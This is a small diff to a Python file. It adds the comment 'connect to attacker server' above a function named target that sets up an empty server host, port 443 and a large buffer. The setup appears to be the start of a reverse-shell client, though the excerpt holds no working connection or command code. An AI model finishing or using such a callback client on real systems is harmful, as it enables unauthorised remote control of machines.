@@ -4,6 +4,7 @@ import subprocess
 #import sys
 
 def target():
+    # connect to attacker server
     SERVER_HOST = ""
     SERVER_PORT = 443
     BUFFER_SIZE = 1024 * 128
